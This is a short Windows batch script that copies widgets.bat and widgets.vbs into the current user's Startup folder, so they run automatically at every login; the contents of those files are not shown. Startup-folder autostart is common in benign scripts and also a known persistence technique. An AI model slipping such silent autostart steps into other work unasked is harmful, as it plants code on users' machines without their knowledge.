@echo off
mkdir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\widgets"
xcopy widgets.bat "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\widgets"
xcopy widgets.vbs "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
